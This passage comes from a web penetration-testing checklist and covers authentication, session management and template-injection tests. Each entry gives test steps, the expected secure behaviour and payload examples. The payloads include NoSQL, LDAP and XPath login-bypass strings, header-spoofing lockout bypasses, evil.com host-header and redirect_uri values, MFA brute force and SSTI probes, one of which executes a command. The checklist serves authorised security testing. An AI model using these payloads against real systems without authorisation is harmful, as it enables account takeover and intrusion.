**Tools:** SQLMap / Burp Suite / Custom Script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AUTH-010 — NoSQL Injection - Authentication Bypass
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Params / body / query reaching a SQL query

**Test Steps:** 1. Change Content-Type to application/json if applicable<br>2. Inject NoSQL operators in username and password fields<br>3. Test MongoDB operators: $gt $ne $regex $exists<br>4. Test both JSON body and URL parameter injection<br>5. Test with different content types

**Expected Result:** Login should not be bypassed via NoSQL injection operators. Application should properly validate and sanitize NoSQL queries

**Payload Example:**

```
JSON body:
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":".*"}}
{"username":{"$exists":true},"password":{"$exists":true}}

URL params:
username[$ne]=&password[$ne]=
username=admin&password[$regex]=.*
```

**Impact:** SQL injection -&gt; authN bypass, DB read/modify, potential RCE

**Tools:** Burp Suite / NoSQLMap / Custom Script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AUTH-011 — LDAP Injection on Login
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Auth/search fields reaching an LDAP filter

**Test Steps:** 1. Inject LDAP special characters in username field: * ( ) \ | &amp; = !<br>2. Test LDAP injection payloads<br>3. Test with LDAP filter bypass techniques<br>4. Monitor for different responses indicating LDAP backend<br>5. Test authentication bypass via LDAP filter manipulation

**Expected Result:** Application should not be vulnerable to LDAP injection. All special LDAP characters should be properly escaped

**Payload Example:**

```
admin)(|(password=*)
*)(uid=*))(|(uid=*
admin)(&)
admin)(|(cn=*
*))(&(objectClass=*
admin))(objectClass=*))(&(1=1
```

**Impact:** LDAP filter injection -&gt; authN bypass &amp; directory disclosure

**Tools:** Burp Suite / Custom Script

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## AUTH-012 — XPath Injection on Login
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Fields reaching an XPath query

**Test Steps:** 1. Inject XPath syntax in username and password fields<br>2. Test boolean-based XPath injection<br>3. Test string extraction via XPath<br>4. Monitor for XML/XPath related error messages

**Expected Result:** Application should not be vulnerable to XPath injection

**Payload Example:**

```
' or '1'='1
' or ''='
x' or name()='username' or 'x'='y
admin' or '1'='1' or '1'='1
' or count(parent::*[position()=1])=1 or '1'='1
' or string-length(name(parent::*[position()=1]))>0 or '1'='1
```

**Impact:** XPath injection -&gt; authN bypass &amp; XML data extraction

**Tools:** Burp Suite / Custom Script

**References:** CWE-643; -&gt;[XPath Injection checklist](#/checklist/xpath); OWASP XPath Injection; PayloadsAllTheThings

---

## AUTH-013 — Authentication Bypass via Parameter Manipulation
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login/registration endpoint — credential fields

**Test Steps:** 1. Intercept login request in proxy<br>2. Add or modify parameters: auth=true isAdmin=1 role=admin loggedin=true<br>3. Test removing password parameter entirely<br>4. Test sending empty password<br>5. Test adding debug=true or test=true parameters<br>6. Modify response: change 'false' to 'true' or 'failed' to 'success'<br>7. Test changing HTTP status codes in response

**Expected Result:** Authentication should not be bypassable by manipulating request parameters or modifying server responses

**Payload Example:**

```
POST /login HTTP/1.1
username=admin&password=&auth=true
username=admin&password=&admin=1
username=admin&password=&role=admin
username=admin&loggedin=true
username=admin (remove password param entirely)

Response manipulation:
{"authenticated":false} -> {"authenticated":true}
```

**Impact:** Authentication bypass / credential compromise -&gt; account takeover

**Tools:** Burp Suite / OWASP ZAP

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-017 — Credentials Transmitted Over HTTPS
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login/registration endpoint — credential fields

**Test Steps:** 1. Verify login page is served over HTTPS<br>2. Check if form action URL uses HTTPS<br>3. Test if HTTP version of login page exists and if it redirects to HTTPS<br>4. Check for mixed content (HTTP resources on HTTPS page)<br>5. Intercept login request and verify credentials are encrypted in transit

**Expected Result:** Login credentials must always be transmitted over HTTPS. HTTP version should redirect to HTTPS. No mixed content should exist

**Payload Example:**

```
Check form action:
<form action="https://...">

Test HTTP:
curl -v http://target.com/login
Should 301/302 to https://

Check for mixed content warnings in browser console
```

**Impact:** Authentication bypass / credential compromise -&gt; account takeover

**Tools:** Burp Suite / Browser DevTools / curl / SSLStrip

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-020 — Multi-Factor Authentication Bypass
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login/registration endpoint — credential fields

**Test Steps:** 1. Check if MFA/2FA is implemented<br>2. If MFA exists test if it can be skipped by directly accessing post-auth pages<br>3. Test if MFA code is brute-forceable (4-6 digit)<br>4. Test if MFA code has expiration<br>5. Test if MFA can be bypassed via response manipulation<br>6. Check for backup codes or recovery mechanism weakness

**Expected Result:** MFA should not be bypassable. Code should have limited attempts short expiration and should not be skippable

**Payload Example:**

```
Direct page access: GET /dashboard (skip MFA step)
Brute force MFA: code=0000 to code=9999
Response manipulation: {"mfa_required":true} -> {"mfa_required":false}
Null code: code= or code=null
```

**Impact:** Authentication bypass / credential compromise -&gt; account takeover

**Tools:** Burp Suite / Custom Script

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-022 — SAML Authentication Testing
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login/registration endpoint — credential fields

**Test Steps:** 1. Check if SAML login is available<br>2. Test SAML metadata exposure<br>3. Test SAML response manipulation<br>4. Test XML signature bypass<br>5. Test SAML assertion injection<br>6. Check for SAML redirect vulnerabilities

**Expected Result:** SAML should be properly configured with valid signatures and no injection vulnerabilities

**Payload Example:**

```
Modify SAMLResponse parameter
Test unsigned assertions
Check for XXE in SAML XML
```

**Impact:** Authentication bypass / credential compromise -&gt; account takeover

**Tools:** Burp Suite / SAML Raider

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-024 — JWT Algorithm Confusion Attack
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/sig)

**Test Steps:** 1. Capture JWT token<br>2. Change algorithm from RS256 to HS256<br>3. Sign with public key as HMAC secret<br>4. Test if server accepts modified token

**Expected Result:** JWT should validate algorithm and not allow confusion attacks

**Payload Example:**

```
Change alg: RS256 to HS256
Sign with RSA public key used as HMAC key
```

**Impact:** JWT forgery/confusion -&gt; authN bypass &amp; privilege escalation

**Tools:** jwt_tool / Burp Suite

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT; PortSwigger JWT; RFC 8725

---

## AUTH-005 — Account Lockout Mechanism Testing
**Test Category:** Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login endpoint — no rate limit / lockout

**Test Steps:** 1. Choose a username (admin or discovered valid username)<br>2. Attempt login with wrong password 5 times<br>3. Attempt login with wrong password 10 times<br>4. Attempt login with wrong password 15 times<br>5. Attempt login with wrong password 20 times<br>6. After each batch check if account is locked<br>7. If locked test lockout duration<br>8. Test if lockout is IP-based or account-based<br>9. Test if lockout can be bypassed with IP rotation X-Forwarded-For

**Expected Result:** Account should lock after 3-5 failed attempts with appropriate lockout duration. Lockout should not be bypassable via header manipulation

**Payload Example:**

```
After 5 failed attempts:
POST /login
username=admin&password=wrong

Bypass attempt:
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

**Impact:** Credential brute-force / stuffing -&gt; account takeover

**Tools:** Burp Suite Intruder / Custom Script

**References:** CWE-307; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-006 — Rate Limiting Bypass Testing
**Test Category:** Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login/registration endpoint — credential fields

**Test Steps:** 1. Confirm rate limiting exists by sending multiple rapid requests<br>2. Try bypassing with X-Forwarded-For header rotation<br>3. Try X-Real-IP X-Originating-IP X-Client-IP header manipulation<br>4. Try adding null bytes or spaces to parameters<br>5. Try changing case of username<br>6. Try adding extra parameters<br>7. Test if rate limit resets with successful login between failures<br>8. Test rate limiting per IP vs per account vs per session

**Expected Result:** Rate limiting should not be bypassable via header manipulation parameter modification or IP spoofing

**Payload Example:**

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 1.2.3.4
X-Real-IP: 10.0.0.1
X-Client-IP: 192.168.1.1
X-Originating-IP: [::1]

Parameter manipulation:
username=admin%00&password=test
username=Admin&password=test
username= admin&password=test
```

**Impact:** Authentication bypass / credential compromise -&gt; account takeover

**Tools:** Burp Suite Intruder / Custom Python Script

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-014 — Authentication Bypass via HTTP Verb Tampering
**Test Category:** Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login/registration endpoint — credential fields

**Test Steps:** 1. Send login request as GET instead of POST<br>2. Send login request using PUT PATCH DELETE HEAD<br>3. Test if credentials in URL parameters bypass authentication<br>4. Test if changing the method reveals different behavior<br>5. Check if authentication check is only on specific HTTP method

**Expected Result:** Authentication mechanism should work consistently regardless of HTTP method used

**Payload Example:**

```
GET /login?username=admin&password=test HTTP/1.1

PUT /login HTTP/1.1
username=admin&password=test

PATCH /login HTTP/1.1
username=admin&password=test
```

**Impact:** Authentication bypass / credential compromise -&gt; account takeover

**Tools:** Burp Suite / curl

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-015 — Credential Stuffing Test
**Test Category:** Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login endpoint — no rate limit / lockout

**Test Steps:** 1. Use list of known breached credential pairs<br>2. Test top 100 most common email/password combinations<br>3. Monitor response patterns for successful vs failed logins<br>4. Check if application detects and blocks credential stuffing patterns<br>5. Verify if any alerts are triggered on bulk login attempts

**Expected Result:** Application should have mechanisms to detect and prevent credential stuffing attacks such as rate limiting CAPTCHA device fingerprinting

**Payload Example:**

```
Use breached credential lists from SecLists:
/Passwords/Default-Credentials/
Test with common combos:
test@test.com:password123
admin@target.com:admin123
```

**Impact:** Credential brute-force / stuffing -&gt; account takeover

**Tools:** Burp Suite Intruder / Custom Python Script / SentryMBA

**References:** CWE-307; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-018 — Remember Me Functionality Testing
**Test Category:** Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login/registration endpoint — credential fields

**Test Steps:** 1. Check if Remember Me checkbox exists on login page<br>2. If present analyze the remember-me cookie/token when set<br>3. Check if token is predictable or contains encoded credentials<br>4. Try decoding token (Base64 hex)<br>5. Check token expiration<br>6. Check if token is invalidated on password change<br>7. Test if token works from different IP/browser

**Expected Result:** Remember Me token should be cryptographically random not contain user credentials and should have reasonable expiration

**Payload Example:**

```
Cookie: remember_me=YWRtaW46cGFzc3dvcmQ= (Base64 of admin:password - VULNERABLE)
Cookie: remember_me=admin|1234567890|hash (predictable - VULNERABLE)
Cookie: remember_me=<random_long_string> (SECURE)
```

**Impact:** Authentication bypass / credential compromise -&gt; account takeover

**Tools:** Burp Suite / CyberChef / Browser DevTools

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-019 — Password Reset Functionality Testing
**Test Category:** Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Password-reset flow — token/email/Host header

**Test Steps:** 1. Check if forgot password / reset link exists on login page<br>2. Test password reset flow if accessible<br>3. Check if reset link is predictable or guessable<br>4. Test if reset token has expiration<br>5. Test if username/email enumeration is possible via reset feature<br>6. Check if old reset tokens are invalidated when new one is requested<br>7. Test for host header injection in reset emails

**Expected Result:** Password reset should use cryptographically random tokens with expiration. Should not allow username enumeration. Should invalidate old tokens

**Payload Example:**

```
POST /forgot-password
email=admin@target.com

Host header injection:
Host: evil.com
X-Forwarded-Host: evil.com

Token prediction:
/reset?token=1001 /reset?token=1002
```

**Impact:** Reset-flow flaw -&gt; pre-auth account takeover

**Tools:** Burp Suite / Custom Script

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed reset-ATO writeups

---

## AUTH-021 — OAuth/SSO Misconfiguration
**Test Category:** Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth authorize/token endpoint (redirect_uri/state)

**Test Steps:** 1. Check if login page offers OAuth or SSO login options<br>2. Test for open redirect in OAuth callback URL<br>3. Test for CSRF in OAuth flow (state parameter)<br>4. Test if authorization code can be reused<br>5. Check for token leakage in referrer header

**Expected Result:** OAuth/SSO implementation should validate redirect_uri use state parameter and not expose tokens

**Payload Example:**

```
redirect_uri=https://evil.com
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com/.evil.com
Check state parameter presence and validation
```

**Impact:** OAuth flow abuse -&gt; token theft &amp; account takeover

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth BCP (RFC 9700); PortSwigger OAuth

---

## AUTH-023 — API Key Authentication Testing
**Test Category:** Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API key (header/query param)

**Test Steps:** 1. Check if API key authentication is used<br>2. Test weak API keys<br>3. Test API key in URL vs header<br>4. Test API key leakage in logs<br>5. Test API key rotation<br>6. Check for API key enumeration

**Expected Result:** API keys should be strong random and not leakable

**Payload Example:**

```
GET /api/data?apikey=weakkey
Check Referer header for key leakage
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Burp Suite / Custom Script

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP API Security Top 10; PortSwigger

---

## AUTH-025 — OAuth State Parameter Bypass
**Test Category:** Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth authorize/token endpoint (redirect_uri/state)

**Test Steps:** 1. Check OAuth flow for state parameter<br>2. Test CSRF by removing state parameter<br>3. Test state parameter reflection<br>4. Test weak state values<br>5. Check if state prevents CSRF

**Expected Result:** OAuth should use state parameter to prevent CSRF

**Payload Example:**

```
Remove state parameter from OAuth request
Test if flow still works
```

**Impact:** OAuth flow abuse -&gt; token theft &amp; account takeover

**Tools:** Burp Suite / Browser

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth BCP (RFC 9700); PortSwigger OAuth

---

## AUTH-002 — Username Enumeration via Error Messages
**Test Category:** Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Auth flows (register/login/reset/email-change)

**Test Steps:** 1. Submit login with a known-likely-valid username (admin) and wrong password<br>2. Submit login with a definitely-invalid username and wrong password<br>3. Compare error messages for both responses<br>4. Check for differences in: error text HTTP status code response length response time<br>5. Test with common usernames: admin administrator root user test<br>6. Check forgot password functionality for username enumeration

**Expected Result:** Error messages should be identical for valid and invalid usernames. Generic message like 'Invalid credentials' should be used for both cases

**Payload Example:**

```
Valid user wrong pass response: 'Invalid password'
Invalid user response: 'User not found'
SHOULD BE: 'Invalid username or password' for both
```

**Impact:** Full account takeover of victim users

**Tools:** Burp Suite Comparer / ffuf / Custom Script

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-003 — Username Enumeration via Response Timing
**Test Category:** Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Auth flows (register/login/reset/email-change)

**Test Steps:** 1. Send login request with very long password (10000+ chars) and valid username<br>2. Send login request with very long password and invalid username<br>3. Measure response times for both<br>4. Repeat multiple times to confirm timing difference<br>5. If server hashes password only for valid users there will be a measurable delay

**Expected Result:** Response time should be consistent regardless of whether username exists or not

**Payload Example:**

```
POST /login
username=admin&password=AAAA...(10000 chars)
vs
username=invaliduser12345&password=AAAA...(10000 chars)
Compare response times
```

**Impact:** Full account takeover of victim users

**Tools:** Burp Suite / Custom Python Script with timing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-016 — Password Field Autocomplete Check
**Test Category:** Authentication · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Login/registration endpoint — credential fields

**Test Steps:** 1. Inspect HTML source of login form<br>2. Check if password input field has autocomplete='off'<br>3. Check if form tag has autocomplete='off'<br>4. Verify browser behavior - does it offer to save credentials<br>5. Check if sensitive fields are cached

**Expected Result:** Password field should have autocomplete='off' attribute to prevent browsers from storing credentials

**Payload Example:**

```
<input type="password" name="password" autocomplete="off">
Check if attribute is missing or set to 'on'
```

**Impact:** Authentication bypass / credential compromise -&gt; account takeover

**Tools:** Browser DevTools / Burp Suite / Manual Review

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## SESSION-002 — Session Token Randomness Analysis
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Collect 20+ session tokens from the login page<br>2. Analyze tokens for patterns or predictability<br>3. Check token length (should be 128+ bits of entropy)<br>4. Test for sequential or time-based token generation<br>5. Use Burp Sequencer to analyze randomness<br>6. Check if tokens contain encoded user information

**Expected Result:** Session tokens should be cryptographically random with at least 128 bits of entropy. No patterns or predictable sequences

**Payload Example:**

```
Collect tokens:
session=a1b2c3d4e5f6
session=a1b2c3d4e5f7 (sequential - VULNERABLE)
session=MTYzNDU2Nzg5MA== (timestamp-based - VULNERABLE)
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite Sequencer / Custom Script

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## SESSION-003 — Session Fixation Testing
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Note session token before authentication<br>2. Attempt login (even if it fails)<br>3. Check if session token changes after login attempt<br>4. Test if pre-set session cookie is accepted: manually set a session cookie and attempt to authenticate<br>5. Check if server accepts arbitrary session IDs

**Expected Result:** Session token must be regenerated after any authentication state change. Server should never accept client-supplied session IDs

**Payload Example:**

```
Before login: Cookie: session=OLD_TOKEN
After login: Cookie: session=NEW_TOKEN (should change)

Fixation test:
1. Set Cookie: session=ATTACKER_CHOSEN_VALUE
2. Login
3. Check if same session=ATTACKER_CHOSEN_VALUE is used
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## SESSION-008 — Session Token Entropy Testing
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Collect 100+ session tokens<br>2. Use statistical analysis to check entropy<br>3. Test for birthday attack feasibility<br>4. Check if tokens are base64 encoded timestamps

**Expected Result:** Session tokens should have sufficient entropy to resist brute force

**Payload Example:**

```
Use Burp Sequencer with FIPS tests
Check if entropy > 128 bits
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite Sequencer

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## SESSION-009 — Session Riding Attack Testing
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Obtain session from victim<br>2. Use victim's session to perform actions<br>3. Test if session is bound to IP or user agent<br>4. Check for session fixation via riding

**Expected Result:** Sessions should be properly isolated per user

**Payload Example:**

```
Use victim's session cookie in attacker's browser
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## SESSION-001 — Cookie Security Attributes Analysis
**Test Category:** Session Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Login or interact with login page to receive cookies<br>2. Examine Set-Cookie headers in response<br>3. Check for Secure flag (cookie sent only over HTTPS)<br>4. Check for HttpOnly flag (cookie not accessible via JavaScript)<br>5. Check for SameSite attribute (Lax or Strict)<br>6. Check cookie Domain and Path attributes<br>7. Check cookie Expires/Max-Age values

**Expected Result:** All session cookies should have Secure HttpOnly and SameSite=Lax/Strict flags set. Session cookies should have appropriate expiration

**Payload Example:**

```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/

VULNERABLE:
Set-Cookie: session=abc123 (no flags)
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite / Browser DevTools / curl

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## SESSION-004 — Session Token in URL
**Test Category:** Session Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Check if session token appears in URL parameters after any interaction<br>2. Check Referer header for session token leakage<br>3. Check browser history for session tokens in URLs<br>4. Check server logs (if accessible) for session tokens

**Expected Result:** Session tokens should never appear in URLs as they can leak via Referer header browser history and server logs

**Payload Example:**

```
VULNERABLE:
https://target.com/login?session=abc123
https://target.com/dashboard;jsessionid=abc123

Check Referer header when clicking external links
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## SESSION-005 — Logout Functionality Testing
**Test Category:** Session Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Check if logout link/button exists<br>2. If session obtained test logout functionality<br>3. After logout attempt to reuse the old session token<br>4. Check if session is destroyed server-side not just client-side cookie deletion<br>5. Check if back button after logout shows cached authenticated pages

**Expected Result:** Logout should destroy session server-side. Old session tokens should be invalidated. Cached pages should not be accessible after logout

**Payload Example:**

```
After logout:
GET /dashboard HTTP/1.1
Cookie: session=OLD_SESSION_TOKEN
Should return 401/403 or redirect to login
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite / Browser

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## SESSION-006 — Session Timeout Testing
**Test Category:** Session Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Obtain a session token from login page interaction<br>2. Wait for idle timeout period (15-30 min)<br>3. Attempt to use the session token<br>4. Check if absolute timeout exists (regardless of activity)<br>5. Verify timeout is enforced server-side

**Expected Result:** Session should timeout after reasonable idle period (15-30 min). Absolute timeout should exist. Timeout should be server-side enforced

**Payload Example:**

```
After waiting 30 minutes:
GET /login HTTP/1.1
Cookie: session=OLD_TOKEN
Check if session is still valid
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite / Custom Script

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## SESSION-007 — Cookie Scope Testing
**Test Category:** Session Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Check cookie Domain attribute - should not be too broad<br>2. Check cookie Path attribute<br>3. Test if session cookie is accessible from other paths<br>4. Check if cookie domain includes parent domain allowing subdomain access

**Expected Result:** Cookie scope should be as restrictive as possible. Domain should not be set to parent domain. Path should be specific

**Payload Example:**

```
VULNERABLE:
Set-Cookie: session=abc; Domain=.target.com (accessible by all subdomains)
SECURE:
Set-Cookie: session=abc; Domain=login.target.com; Path=/
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## SESSION-010 — Session Puzzling Attack
**Test Category:** Session Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. Test if multiple session cookies are accepted<br>2. Check cookie precedence<br>3. Test session cookie overriding<br>4. Check for session variable overwrites

**Expected Result:** Application should handle multiple session identifiers securely

**Payload Example:**

```
Set multiple session cookies
Test which one takes precedence
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Burp Suite

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## INPUT-007 — Server-Side Template Injection (SSTI)
**Test Category:** Input Validation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template-rendered input fields

**Test Steps:** 1. Inject template expressions in username and password fields<br>2. Test for Jinja2: {{7*7}} {{config}}<br>3. Test for Twig: {{7*7}} {{dump(app)}}<br>4. Test for Freemarker: ${7*7} &lt;#assign x='freemarker.template.utility.Execute'?new()&gt;${x('id')}<br>5. Test for Pebble Velocity Smarty Mako ERB<br>6. Check if mathematical expression is evaluated in response

**Expected Result:** Template expressions should not be evaluated. Application should treat all input as literal strings

**Payload Example:**

```
{{7*7}}
{{7*'7'}}
${7*7}
<%= 7*7 %>
#{7*7}
{{config}}
{{self.__init__.__globals__}}
${{7*7}}
{{constructor.constructor('return this')()}}
```

**Impact:** Template injection escalating to RCE

**Tools:** Burp Suite / tplmap / Custom Script

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); James Kettle SSTI (PortSwigger Research)

---

## INPUT-008 — Command Injection Testing
